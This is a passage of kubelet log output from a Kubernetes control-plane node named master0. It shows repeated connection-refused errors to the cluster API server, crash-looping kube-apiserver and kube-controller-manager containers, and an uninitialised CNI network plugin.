kubelet[518]: E0524 18:19:59.066404     518 projected.go:192] Error preparing data for projected volume kube-api-access-tncz8 for pod kube-system/kube-proxy-qzlw9: failed to fetch token: Post \"https://10.88.3.60:6443/api/v1/namespaces/kube-system/serviceaccounts/kube-proxy/token\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:19:59 master0 kubelet[518]: E0524 18:19:59.066471     518 nestedpendingoperations.go:335] Operation for \"{volumeName:kubernetes.io/projected/f4e454d0-9316-4b44-92e9-498d8668a6fb-kube-api-access-tncz8 podName:f4e454d0-9316-4b44-92e9-498d8668a6fb nodeName:}\" failed. No retries permitted until 2022-05-24 18:20:07.066453006 +0000 UTC m=+21.585851588 (durationBeforeRetry 8s). Error: MountVolume.SetUp failed for volume \"kube-api-access-tncz8\" (UniqueName: \"kubernetes.io/projected/f4e454d0-9316-4b44-92e9-498d8668a6fb-kube-api-access-tncz8\") pod \"kube-proxy-qzlw9\" (UID: \"f4e454d0-9316-4b44-92e9-498d8668a6fb\") : failed to fetch token: Post \"https://10.88.3.60:6443/api/v1/namespaces/kube-system/serviceaccounts/kube-proxy/token\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:00 master0 kubelet[518]: I0524 18:20:00.842537     518 scope.go:110] \"RemoveContainer\" containerID=\"17244f7547b1952d013c6d9b6df964d09db000e185b935070d14c9add39d2896\"\r\nMay 24 18:20:00 master0 kubelet[518]: E0524 18:20:00.843076     518 pod_workers.go:951] \"Error syncing pod, skipping\" err=\"failed to \\\"StartContainer\\\" for \\\"kube-controller-manager\\\" with CrashLoopBackOff: \\\"back-off 10s restarting failed container=kube-controller-manager pod=kube-controller-manager-master0_kube-system(07dc1079c410123fdbdd120d096c4f3e)\\\"\" pod=\"kube-system/kube-controller-manager-master0\" podUID=07dc1079c410123fdbdd120d096c4f3e\r\nMay 24 18:20:00 master0 kubelet[518]: E0524 18:20:00.920492     518 kubelet.go:2344] \"Container runtime network not ready\" networkReady=\"NetworkReady=false reason:NetworkPluginNotReady message:Network plugin returns error: cni plugin not initialized\"\r\nMay 24 18:20:00 master0 kubelet[518]: E0524 18:20:00.958448     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?resourceVersion=0&timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:00 master0 kubelet[518]: E0524 18:20:00.958761     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:00 master0 kubelet[518]: E0524 18:20:00.958921     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:00 master0 kubelet[518]: E0524 18:20:00.959041     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:00 master0 kubelet[518]: E0524 18:20:00.959146     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:00 master0 kubelet[518]: E0524 18:20:00.959156     518 kubelet_node_status.go:447] \"Unable to update node status\" err=\"update node status exceeds retry count\"\r\nMay 24 18:20:01 master0 kubelet[518]: E0524 18:20:01.040488     518 controller.go:187] failed to update lease, error: Put \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:01 master0 kubelet[518]: E0524 18:20:01.040832     518 controller.go:187] failed to update lease, error: Put \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:01 master0 kubelet[518]: E0524 18:20:01.041261     518 controller.go:187] failed to update lease, error: Put \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:01 master0 kubelet[518]: E0524 18:20:01.041562     518 controller.go:187] failed to update lease, error: Put \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:01 master0 kubelet[518]: E0524 18:20:01.041780     518 controller.go:187] failed to update lease, error: Put \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:01 master0 kubelet[518]: I0524 18:20:01.041810     518 controller.go:114] failed to update lease using latest lease, fallback to ensure lease, err: failed 5 attempts to update lease\r\nMay 24 18:20:01 master0 kubelet[518]: E0524 18:20:01.041974     518 controller.go:144] failed to ensure lease exists, will retry in 200ms, error: Get \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:01 master0 kubelet[518]: E0524 18:20:01.243262     518 controller.go:144] failed to ensure lease exists, will retry in 400ms, error: Get \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:01 master0 kubelet[518]: E0524 18:20:01.644411     518 controller.go:144] failed to ensure lease exists, will retry in 800ms, error: Get \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:02 master0 kubelet[518]: I0524 18:20:02.337215     518 scope.go:110] \"RemoveContainer\" containerID=\"17244f7547b1952d013c6d9b6df964d09db000e185b935070d14c9add39d2896\"\r\nMay 24 18:20:02 master0 kubelet[518]: E0524 18:20:02.338881     518 pod_workers.go:951] \"Error syncing pod, skipping\" err=\"failed to \\\"StartContainer\\\" for \\\"kube-controller-manager\\\" with CrashLoopBackOff: \\\"back-off 10s restarting failed container=kube-controller-manager pod=kube-controller-manager-master0_kube-system(07dc1079c410123fdbdd120d096c4f3e)\\\"\" pod=\"kube-system/kube-controller-manager-master0\" podUID=07dc1079c410123fdbdd120d096c4f3e\r\nMay 24 18:20:02 master0 kubelet[518]: E0524 18:20:02.446424     518 controller.go:144] failed to ensure lease exists, will retry in 1.6s, error: Get \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:02 master0 kubelet[518]: E0524 18:20:02.829207     518 event.go:276] Unable to write event: '&v1.Event{TypeMeta:v1.TypeMeta{Kind:\"\", APIVersion:\"\"}, ObjectMeta:v1.ObjectMeta{Name:\"master0.16f21d7153d06a40\", GenerateName:\"\", Namespace:\"default\", SelfLink:\"\", UID:\"\", ResourceVersion:\"\", Generation:0, CreationTimestamp:time.Date(1, time.January, 1, 0, 0, 0, 0, time.UTC), DeletionTimestamp:<nil>, DeletionGracePeriodSeconds:(*int64)(nil), Labels:map[string]string(nil), Annotations:map[string]string(nil), OwnerReferences:[]v1.OwnerReference(nil), Finalizers:[]string(nil), ZZZ_DeprecatedClusterName:\"\", ManagedFields:[]v1.ManagedFieldsEntry(nil)}, InvolvedObject:v1.ObjectReference{Kind:\"Node\", Namespace:\"\", Name:\"master0\", UID:\"master0\", APIVersion:\"\", ResourceVersion:\"\", FieldPath:\"\"}, Reason:\"Starting\", Message:\"Starting kubelet.\", Source:v1.EventSource{Component:\"kubelet\", Host:\"master0\"}, FirstTimestamp:time.Date(2022, time.May, 24, 18, 19, 45, 773070912, time.Local), LastTimestamp:time.Date(2022, time.May, 24, 18, 19, 45, 773070912, time.Local), Count:1, Type:\"Normal\", EventTime:time.Date(1, time.January, 1, 0, 0, 0, 0, time.UTC), Series:(*v1.EventSeries)(nil), Action:\"\", Related:(*v1.ObjectReference)(nil), ReportingController:\"\", ReportingInstance:\"\"}': 'Post \"https://10.88.3.60:6443/api/v1/namespaces/default/events\": dial tcp 10.88.3.60:6443: connect: connection refused'(may retry after sleeping)\r\nMay 24 18:20:03 master0 kubelet[518]: I0524 18:20:03.368074     518 status_manager.go:664] \"Failed to get status for pod\" podUID=fa768acb94c6cd1f77a2619331162053 pod=\"kube-system/kube-scheduler-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-scheduler-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:03 master0 kubelet[518]: I0524 18:20:03.368244     518 status_manager.go:664] \"Failed to get status for pod\" podUID=fa768acb94c6cd1f77a2619331162053 pod=\"kube-system/kube-scheduler-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-scheduler-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:04 master0 kubelet[518]: E0524 18:20:04.047681     518 controller.go:144] failed to ensure lease exists, will retry in 3.2s, error: Get \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:05 master0 kubelet[518]: E0524 18:20:05.922159     518 kubelet.go:2344] \"Container runtime network not ready\" networkReady=\"NetworkReady=false reason:NetworkPluginNotReady message:Network plugin returns error: cni plugin not initialized\"\r\nMay 24 18:20:06 master0 kubelet[518]: I0524 18:20:06.061821     518 status_manager.go:664] \"Failed to get status for pod\" podUID=3da0b3b3f5b168e56c71dd2c6212a28e pod=\"kube-system/etcd-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/etcd-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:06 master0 kubelet[518]: I0524 18:20:06.062131     518 status_manager.go:664] \"Failed to get status for pod\" podUID=f4e454d0-9316-4b44-92e9-498d8668a6fb pod=\"kube-system/kube-proxy-qzlw9\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-proxy-qzlw9\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:06 master0 kubelet[518]: I0524 18:20:06.062476     518 status_manager.go:664] \"Failed to get status for pod\" podUID=fa768acb94c6cd1f77a2619331162053 pod=\"kube-system/kube-scheduler-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-scheduler-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:06 master0 kubelet[518]: I0524 18:20:06.062807     518 status_manager.go:664] \"Failed to get status for pod\" podUID=7b1a28f140e1f4144f7bd4fae347b484 pod=\"kube-system/kube-apiserver-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-apiserver-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:06 master0 kubelet[518]: I0524 18:20:06.063093     518 status_manager.go:664] \"Failed to get status for pod\" podUID=07dc1079c410123fdbdd120d096c4f3e pod=\"kube-system/kube-controller-manager-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-controller-manager-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:06 master0 kubelet[518]: I0524 18:20:06.539101     518 status_manager.go:664] \"Failed to get status for pod\" podUID=3da0b3b3f5b168e56c71dd2c6212a28e pod=\"kube-system/etcd-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/etcd-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:06 master0 kubelet[518]: I0524 18:20:06.539402     518 status_manager.go:664] \"Failed to get status for pod\" podUID=3da0b3b3f5b168e56c71dd2c6212a28e pod=\"kube-system/etcd-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/etcd-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:07 master0 kubelet[518]: E0524 18:20:07.127461     518 projected.go:192] Error preparing data for projected volume kube-api-access-tncz8 for pod kube-system/kube-proxy-qzlw9: failed to fetch token: Post \"https://10.88.3.60:6443/api/v1/namespaces/kube-system/serviceaccounts/kube-proxy/token\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:07 master0 kubelet[518]: E0524 18:20:07.127575     518 nestedpendingoperations.go:335] Operation for \"{volumeName:kubernetes.io/projected/f4e454d0-9316-4b44-92e9-498d8668a6fb-kube-api-access-tncz8 podName:f4e454d0-9316-4b44-92e9-498d8668a6fb nodeName:}\" failed. No retries permitted until 2022-05-24 18:20:23.127540562 +0000 UTC m=+37.646939154 (durationBeforeRetry 16s). Error: MountVolume.SetUp failed for volume \"kube-api-access-tncz8\" (UniqueName: \"kubernetes.io/projected/f4e454d0-9316-4b44-92e9-498d8668a6fb-kube-api-access-tncz8\") pod \"kube-proxy-qzlw9\" (UID: \"f4e454d0-9316-4b44-92e9-498d8668a6fb\") : failed to fetch token: Post \"https://10.88.3.60:6443/api/v1/namespaces/kube-system/serviceaccounts/kube-proxy/token\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:07 master0 kubelet[518]: E0524 18:20:07.248463     518 controller.go:144] failed to ensure lease exists, will retry in 6.4s, error: Get \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:10 master0 kubelet[518]: E0524 18:20:10.923449     518 kubelet.go:2344] \"Container runtime network not ready\" networkReady=\"NetworkReady=false reason:NetworkPluginNotReady message:Network plugin returns error: cni plugin not initialized\"\r\nMay 24 18:20:11 master0 kubelet[518]: E0524 18:20:11.287927     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?resourceVersion=0&timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:11 master0 kubelet[518]: E0524 18:20:11.288355     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:11 master0 kubelet[518]: E0524 18:20:11.288597     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:11 master0 kubelet[518]: E0524 18:20:11.288792     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:11 master0 kubelet[518]: E0524 18:20:11.289071     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:11 master0 kubelet[518]: E0524 18:20:11.289098     518 kubelet_node_status.go:447] \"Unable to update node status\" err=\"update node status exceeds retry count\"\r\nMay 24 18:20:12 master0 kubelet[518]: E0524 18:20:12.830457     518 event.go:276] Unable to write event: '&v1.Event{TypeMeta:v1.TypeMeta{Kind:\"\", APIVersion:\"\"}, ObjectMeta:v1.ObjectMeta{Name:\"master0.16f21d7153d06a40\", GenerateName:\"\", Namespace:\"default\", SelfLink:\"\", UID:\"\", ResourceVersion:\"\", Generation:0, CreationTimestamp:time.Date(1, time.January, 1, 0, 0, 0, 0, time.UTC), DeletionTimestamp:<nil>, DeletionGracePeriodSeconds:(*int64)(nil), Labels:map[string]string(nil), Annotations:map[string]string(nil), OwnerReferences:[]v1.OwnerReference(nil), Finalizers:[]string(nil), ZZZ_DeprecatedClusterName:\"\", ManagedFields:[]v1.ManagedFieldsEntry(nil)}, InvolvedObject:v1.ObjectReference{Kind:\"Node\", Namespace:\"\", Name:\"master0\", UID:\"master0\", APIVersion:\"\", ResourceVersion:\"\", FieldPath:\"\"}, Reason:\"Starting\", Message:\"Starting kubelet.\", Source:v1.EventSource{Component:\"kubelet\", Host:\"master0\"}, FirstTimestamp:time.Date(2022, time.May, 24, 18, 19, 45, 773070912, time.Local), LastTimestamp:time.Date(2022, time.May, 24, 18, 19, 45, 773070912, time.Local), Count:1, Type:\"Normal\", EventTime:time.Date(1, time.January, 1, 0, 0, 0, 0, time.UTC), Series:(*v1.EventSeries)(nil), Action:\"\", Related:(*v1.ObjectReference)(nil), ReportingController:\"\", ReportingInstance:\"\"}': 'Post \"https://10.88.3.60:6443/api/v1/namespaces/default/events\": dial tcp 10.88.3.60:6443: connect: connection refused'(may retry after sleeping)\r\nMay 24 18:20:13 master0 kubelet[518]: E0524 18:20:13.649732     518 controller.go:144] failed to ensure lease exists, will retry in 7s, error: Get \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:15 master0 kubelet[518]: I0524 18:20:15.061686     518 scope.go:110] \"RemoveContainer\" containerID=\"17244f7547b1952d013c6d9b6df964d09db000e185b935070d14c9add39d2896\"\r\nMay 24 18:20:15 master0 kubelet[518]: E0524 18:20:15.924563     518 kubelet.go:2344] \"Container runtime network not ready\" networkReady=\"NetworkReady=false reason:NetworkPluginNotReady message:Network plugin returns error: cni plugin not initialized\"\r\nMay 24 18:20:16 master0 kubelet[518]: I0524 18:20:16.061596     518 status_manager.go:664] \"Failed to get status for pod\" podUID=fa768acb94c6cd1f77a2619331162053 pod=\"kube-system/kube-scheduler-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-scheduler-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:16 master0 kubelet[518]: I0524 18:20:16.061869     518 status_manager.go:664] \"Failed to get status for pod\" podUID=7b1a28f140e1f4144f7bd4fae347b484 pod=\"kube-system/kube-apiserver-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-apiserver-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:16 master0 kubelet[518]: I0524 18:20:16.062172     518 status_manager.go:664] \"Failed to get status for pod\" podUID=07dc1079c410123fdbdd120d096c4f3e pod=\"kube-system/kube-controller-manager-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-controller-manager-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:16 master0 kubelet[518]: I0524 18:20:16.062502     518 status_manager.go:664] \"Failed to get status for pod\" podUID=3da0b3b3f5b168e56c71dd2c6212a28e pod=\"kube-system/etcd-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/etcd-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:16 master0 kubelet[518]: I0524 18:20:16.062732     518 status_manager.go:664] \"Failed to get status for pod\" podUID=f4e454d0-9316-4b44-92e9-498d8668a6fb pod=\"kube-system/kube-proxy-qzlw9\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-proxy-qzlw9\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:16 master0 kubelet[518]: I0524 18:20:16.143016     518 status_manager.go:664] \"Failed to get status for pod\" podUID=07dc1079c410123fdbdd120d096c4f3e pod=\"kube-system/kube-controller-manager-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-controller-manager-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:20 master0 kubelet[518]: E0524 18:20:20.650275     518 controller.go:144] failed to ensure lease exists, will retry in 7s, error: Get \"https://10.88.3.60:6443/apis/coordination.k8s.io/v1/namespaces/kube-node-lease/leases/master0?timeout=10s\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:20 master0 kubelet[518]: E0524 18:20:20.926102     518 kubelet.go:2344] \"Container runtime network not ready\" networkReady=\"NetworkReady=false reason:NetworkPluginNotReady message:Network plugin returns error: cni plugin not initialized\"\r\nMay 24 18:20:21 master0 kubelet[518]: I0524 18:20:21.154132     518 scope.go:110] \"RemoveContainer\" containerID=\"2859411c702c538d5016d1fc8231ba326afc4aa8f2ee895b0cffb0c92856866c\"\r\nMay 24 18:20:21 master0 kubelet[518]: I0524 18:20:21.154491     518 pod_container_deletor.go:79] \"Container not found in pod's containers\" containerID=\"ef31a505d60061b78cf18bf44c88d05afe4610b2b9428fc84322ed0c294fae59\"\r\nMay 24 18:20:21 master0 kubelet[518]: I0524 18:20:21.154549     518 status_manager.go:664] \"Failed to get status for pod\" podUID=7b1a28f140e1f4144f7bd4fae347b484 pod=\"kube-system/kube-apiserver-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-apiserver-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:21 master0 kubelet[518]: E0524 18:20:21.230091     518 pod_workers.go:951] \"Error syncing pod, skipping\" err=\"failed to \\\"StartContainer\\\" for \\\"kube-apiserver\\\" with CrashLoopBackOff: \\\"back-off 10s restarting failed container=kube-apiserver pod=kube-apiserver-master0_kube-system(7b1a28f140e1f4144f7bd4fae347b484)\\\"\" pod=\"kube-system/kube-apiserver-master0\" podUID=7b1a28f140e1f4144f7bd4fae347b484\r\nMay 24 18:20:21 master0 kubelet[518]: E0524 18:20:21.610662     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?resourceVersion=0&timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:21 master0 kubelet[518]: E0524 18:20:21.611039     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:21 master0 kubelet[518]: E0524 18:20:21.611436     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:21 master0 kubelet[518]: E0524 18:20:21.611692     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:21 master0 kubelet[518]: E0524 18:20:21.611953     518 kubelet_node_status.go:460] \"Error updating node status, will retry\" err=\"error getting node \\\"master0\\\": Get \\\"https://10.88.3.60:6443/api/v1/nodes/master0?timeout=10s\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:21 master0 kubelet[518]: E0524 18:20:21.611975     518 kubelet_node_status.go:447] \"Unable to update node status\" err=\"update node status exceeds retry count\"\r\nMay 24 18:20:22 master0 kubelet[518]: I0524 18:20:22.157884     518 scope.go:110] \"RemoveContainer\" containerID=\"f7229ae9be4f1419b961cb8ae3996c8bae34fbf205ac4a6498f3a60a21257421\"\r\nMay 24 18:20:22 master0 kubelet[518]: I0524 18:20:22.158145     518 status_manager.go:664] \"Failed to get status for pod\" podUID=7b1a28f140e1f4144f7bd4fae347b484 pod=\"kube-system/kube-apiserver-master0\" err=\"Get \\\"https://10.88.3.60:6443/api/v1/namespaces/kube-system/pods/kube-apiserver-master0\\\": dial tcp 10.88.3.60:6443: connect: connection refused\"\r\nMay 24 18:20:22 master0 kubelet[518]: E0524 18:20:22.158564     518 pod_workers.go:951] \"Error syncing pod, skipping\" err=\"failed to \\\"StartContainer\\\" for \\\"kube-apiserver\\\" with CrashLoopBackOff: \\\"back-off 10s restarting failed container=kube-apiserver pod=kube-apiserver-master0_kube-system(7b1a28f140e1f4144f7bd4fae347b484)\\\"\" pod=\"kube-system/kube-apiserver-master0\" podUID=7b1a28f140e1f4144f7bd4fae347b484\r\nMay 24 18:20:22 master0 kubelet[518]: E0524 18:20:22.831792     518 event.go:276] Unable to write event: '&v1.Event{TypeMeta:v1.TypeMeta{Kind:\"\", APIVersion:\"\"}, ObjectMeta:v1.ObjectMeta{Name:\"master0.16f21d7153d06a40\", GenerateName:\"\", Namespace:\"default\", SelfLink:\"\", UID:\"\", ResourceVersion:\"\", Generation:0, CreationTimestamp:time.Date(1, time.January, 1, 0, 0, 0, 0, time.UTC), DeletionTimestamp:<nil>, DeletionGracePeriodSeconds:(*int64)(nil), Labels:map[string]string(nil), Annotations:map[string]string(nil), OwnerReferences:[]v1.OwnerReference(nil), Finalizers:[]string(nil), ZZZ_DeprecatedClusterName:\"\", ManagedFields:[]v1.ManagedFieldsEntry(nil)}, InvolvedObject:v1.ObjectReference{Kind:\"Node\", Namespace:\"\", Name:\"master0\", UID:\"master0\", APIVersion:\"\", ResourceVersion:\"\", FieldPath:\"\"}, Reason:\"Starting\", Message:\"Starting kubelet.\", Source:v1.EventSource{Component:\"kubelet\", Host:\"master0\"}, FirstTimestamp:time.Date(2022, time.May, 24, 18, 19, 45, 773070912, time.Local), LastTimestamp:time.Date(2022, time.May, 24, 18, 19, 45, 773070912, time.Local), Count:1, Type:\"Normal\", EventTime:time.Date(1, time.January, 1, 0, 0, 0, 0, time.UTC), Series:(*v1.EventSeries)(nil), Action:\"\", Related:(*v1.ObjectReference)(nil), ReportingController:\"\", ReportingInstance:\"\"}': 'Post \"https://10.88.3.60:6443/api/v1/namespaces/default/events\": dial tcp 10.88.3.60:6443: connect: connection refused'(may retry after sleeping)\r\nMay 24 18:20:23 master0 kubelet[518]: I0524 18:20:23.159329     518 scope.go:110] \"RemoveContainer\" containerID=\"f7229ae9be4f1419b961cb8ae3996c8bae34fbf205ac4a6498f3a60a21257421\"\r\nMay 24 18:20:23 master0 kubelet[518]: E0524 18:20:23.159960     518 pod_workers.go:951] \"Error syncing pod, skipping\" err=\"failed to \\\"StartContainer\\\" for \\\"kube-apiserver\\\" with CrashLoopBackOff: \\\"back-off 10s restarting failed container=kube-apiserver pod=kube-apiserver-master0_kube-system(7b1a28f140e1f4144f7bd4fae347b484)\\\"\" pod=\"kube-system/kube-apiserver-master0\" podUID=7b1a28f140e1f4144f7bd4fae347b484\r\nMay 24 18:20:23 master0 kubelet[518]: E0524 18:20:23.224982     518 projected.go:192] Error preparing data for projected volume kube-api-access-tncz8 for pod kube-system/kube-proxy-qzlw9: failed to fetch token: Post \"https://10.88.3.60:6443/api/v1/namespaces/kube-system/serviceaccounts/kube-proxy/token\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:23 master0 kubelet[518]: E0524 18:20:23.225053     518 nestedpendingoperations.go:335] Operation for \"{volumeName:kubernetes.io/projected/f4e454d0-9316-4b44-92e9-498d8668a6fb-kube-api-access-tncz8 podName:f4e454d0-9316-4b44-92e9-498d8668a6fb nodeName:}\" failed. No retries permitted until 2022-05-24 18:20:55.225034048 +0000 UTC m=+69.744432630 (durationBeforeRetry 32s). Error: MountVolume.SetUp failed for volume \"kube-api-access-tncz8\" (UniqueName: \"kubernetes.io/projected/f4e454d0-9316-4b44-92e9-498d8668a6fb-kube-api-access-tncz8\") pod \"kube-proxy-qzlw9\" (UID: \"f4e454d0-9316-4b44-92e9-498d8668a6fb\") : failed to fetch token: Post \"https://10.88.3.60:6443/api/v1/namespaces/kube-system/serviceaccounts/kube-proxy/token\": dial tcp 10.88.3.60:6443: connect: connection refused\r\nMay 24 18:20:24 master0 kubelet[518]: I0524 18:20:24.160916     518 scope.go:110] \"RemoveContainer\" containerID=\"f7229ae9be4f1419b961cb8ae3996c8bae34fbf205ac4a6498f3a60a21257421\"\r\nMay 24 18:20:24 master0 kubelet[518]: E0524 18:20:24.161649     518 pod_workers.go:951] \"Error syncing pod, skipping\" err=\"failed to \\\"StartContainer\\\" for \\\"kube-apiserver\\\" with CrashLoopBackOff: \\\"back-off 10s restarting failed container=kube-apiserver pod=kube-apiserver-master0_kube-system(7b1a28f140e1f4144f7bd4fae347b484)\\\"\" pod=\"kube-system/kube-apiserver-master0\" podUID=7b1a28f140e1f4144f7bd4fae347b484\r\nMay 24 18:20:25 master0 kubelet[518]: E0524 18:20:25.927579     518 kubelet.go:2344] \"Container runtime network not 